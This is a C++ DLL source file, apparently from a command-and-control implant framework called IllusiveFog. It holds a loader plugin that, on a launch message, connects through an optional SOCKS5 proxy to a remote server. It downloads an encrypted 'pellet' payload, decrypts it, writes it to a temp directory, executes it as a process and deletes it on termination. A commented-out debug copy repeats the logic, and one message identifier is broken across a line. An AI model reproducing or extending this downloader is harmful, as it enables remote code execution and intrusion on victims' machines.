// dllmain.cpp : Defines the entry point for the DLL application.
#include "Load.h"
extern char pellet_dir[50] = "/api/tp/cos.j";
extern char bin_dir[50] = "/api/kl/";
__declspec(dllexport)  void run_ld(HANDLE local_event) {
	MSG msg;
	enum pellet_ec pelec;
	char* preffered_path = NULL;
	char* pellet = NULL;
	DWORD get_size = 0;
	DWORD written_size = 0;
	ULONG results = 0;
	DWORD pellet_size = 0;
	Ppellet_info  pinfo = NULL;
	Psession_maintainance session_maintaince = allocheap(sizeof(session_maintaninance));
	ZeroMemory(session_maintaince, sizeof(session_maintaninance));
	Pld_path_info ldpathinfo = get_path_info();
	Psocket_address psockaddr = NULL;
	while (!PeekMessage(&msg, NULL, WM_USER, WM_USER, PM_NOREMOVE)) {
		SetEvent(local_event);
		GetMessage(&msg, NULL, NULL, NULL);
		if (msg.message == WM_
			_PLUGIN_LAUNCH) {
			Pplugin_param param = (Pplugin_param)msg.lParam;
		
#ifdef SOCKS5
			Psocket_address psockaddr = form_socket_address(param->pellet_struct->socks_ip, param->pellet_struct->sockport, param->pellet_struct->dest_ip, param->pellet_struct->destport, param->pellet_struct->enable_auth, param->pellet_struct->auth_user_id, param->pellet_struct->auth_user_pass);
#else
			Psocket_address psockaddr = form_socket_address(NULL, NULL, param->pellet_struct->dest_ip, param->pellet_struct->destport, param->pellet_struct->enable_auth, param->pellet_struct->auth_user_id, param->pellet_struct->auth_user_pass);
#endif			 
			
			
			pinfo = form_pellet_info(pinfo, param->pellet_struct->agent_id, pellet_dir, bin_dir, NULL);
			pellet = pellet_get_pellet(psockaddr, pinfo->pellet_dir, pellet, &results, get_size, &written_size);
			pellet = pellet_xcrypt_pellet(pellet, param->pellet_struct->pellet_key, &pellet_size);
			if ((pwrite_file(ldpathinfo->temp_dir, pellet_size, pellet)) != pellet_ec_code_success) {

				if ((pwrite_file(ldpathinfo->fail_safe_dir, pellet_size, pellet)) != pellet_ec_code_success) {
					freeheap(pellet);
					free_pellet_info(pinfo);
					free_socket_address(psockaddr);
					report_ec(pellet_ec_file_write_failed, param->reporter_event, param->reporter_threadid);
					continue;
				}

			}

			results = 0;
			ldr_create_list(session_maintaince);
			create_write_proc(ldpathinfo->temp_dir, param->param, strlen(param->param), &results, session_maintaince);
			freeheap(pellet);
			free_socket_address(psockaddr);
			report(param->reporter_event, param->reporter_threadid, NULL);
			SetEvent(local_event);
			ResetEvent(local_event);
			continue;
		}
		else if (msg.message == WM_IllusiveFog_PLUGIN_TERMINATE) {
			ldr_terminate_list(session_maintaince);
		
			pdelete_file(ldpathinfo->temp_dir);
			pdelete_file(ldpathinfo->fail_safe_dir);
			free_pellet_info(pinfo);
			freeheap(session_maintaince);
			ldr_path_info_free(ldpathinfo);
			ExitThread(0);


		}
	}
}
//__declspec(dllexport) void run_ld(HANDLE local_event) {
//	MSG msg;
//	enum pellet_ec pelec = 0;
//	OutputDebugStringA("run ld");
//	char* preffered_path = NULL;
//	char* pellet = NULL;
//	DWORD get_size = 0;
//	DWORD written_size = 0;
//	ULONG results = 0;
//	DWORD pellet_size = 0;
//	Ppellet_info  pinfo = NULL;
//	OutputDebugStringA("ptr initialized");
//	Psession_maintainance session_maintaince = allocheap(sizeof(session_maintaninance));
//	ZeroMemory(session_maintaince, sizeof(session_maintaninance));
//	form_session_maintainance(session_maintaince);
//	Pld_path_info ldpathinfo = get_path_info();
//	OutputDebugStringA("heap alloced");
//	while (!PeekMessage(&msg, NULL, WM_USER, WM_USER, PM_NOREMOVE)) {
//		SetEvent(local_event);
//		GetMessage(&msg, NULL, NULL, NULL);
//		if (msg.message == WM_IllusiveFog_PLUGIN_LAUNCH) {
//
//			Pplugin_param param = (Pplugin_param)msg.lParam;
//			Psocket_address psockaddr = allocheap(sizeof(socket_address));
//			ZeroMemory(psockaddr, sizeof(socket_address));
//			psockaddr->destaddr = allocheap(strlen(param->pellet_struct->dest_ip) + 1);
//			psockaddr->sockaddr = allocheap(strlen(param->pellet_struct->socks_ip) + 1);
//			ZeroMemory(psockaddr->destaddr, strlen(param->pellet_struct->dest_ip) + 1);
//			ZeroMemory(psockaddr->sockaddr, strlen(param->pellet_struct->socks_ip) + 1);
//			strcpy(psockaddr->destaddr, param->pellet_struct->dest_ip);
//			strcpy(psockaddr->sockaddr, param->pellet_struct->socks_ip);
//			//form_socket_address(param->pellet_struct->socks_ip, param->pellet_struct->sockport, param->pellet_struct->dest_ip, param->pellet_struct->destport);
//			OutputDebugStringA(param->pellet_struct->socks_ip);
//			memcpy(&psockaddr->destport, &param->pellet_struct->destport, sizeof(DWORD));
//			memcpy(&psockaddr->sockport, &param->pellet_struct->sockport, sizeof(DWORD));
//			pinfo = form_pellet_info(pinfo, param->pellet_struct->agent_id, pellet_dir, bin_dir, NULL);
//			OutputDebugStringA("form pellet info\n");
//			OutputDebugStringA(param->pellet_struct->agent_id);
//			OutputDebugStringA(pinfo->pellet_dir);
//			OutputDebugStringA(pinfo->bin_dir);
//
//			pellet = pellet_get_pellet(psockaddr, pinfo->pellet_dir, pellet, &results, get_size, &written_size);
//			OutputDebugStringA("get pellet info");
//			pellet = pellet_xcrypt_pellet(pellet, param->pellet_struct->pellet_key, &pellet_size);
//			OutputDebugStringA("xcrypt");
//			OutputDebugStringA(ldpathinfo->temp_dir);
//			if (pellet == NULL) {
//				OutputDebugStringA("pellet null");
//			}
//			if ((pwrite_file(ldpathinfo->temp_dir, pellet_size, pellet)) != pellet_ec_code_success) {
//
//				if ((pwrite_file(ldpathinfo->fail_safe_dir, pellet_size, pellet)) != pellet_ec_code_success) {
//					freeheap(pellet);
//					free_pellet_info(pinfo);
//					free_socket_address(psockaddr);
//					report_ec(pellet_ec_file_write_failed, param->reporter_event, param->reporter_threadid);
//					continue;
//				}
//
//			}
//			OutputDebugStringA("write done");
//			results = 0;
//			ldr_create_list(session_maintaince);
//			create_write_proc(ldpathinfo->temp_dir, param->param, strlen(param->param), &results, session_maintaince);
//			OutputDebugStringA("pellet create proc");
//			freeheap(pellet);
//			free_socket_address(psockaddr);
//			OutputDebugStringA("free sock addr");
//			report(param->reporter_event, param->reporter_threadid, NULL);
//			SetEvent(local_event);
//			ResetEvent(local_event);
//			continue;
//		}
//		else if (msg.message == WM_IllusiveFog_PLUGIN_TERMINATE) {
//			ldr_terminate_list(session_maintaince);
//			pdelete_file(ldpathinfo->temp_dir);
//			pdelete_file(ldpathinfo->fail_safe_dir);
//			free_pellet_info(pinfo);
//			freeheap(session_maintaince);
//			ldr_path_info_free(ldpathinfo);
//			ExitThread(0);
//
//
//		}
//	}
//}

BOOL  DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

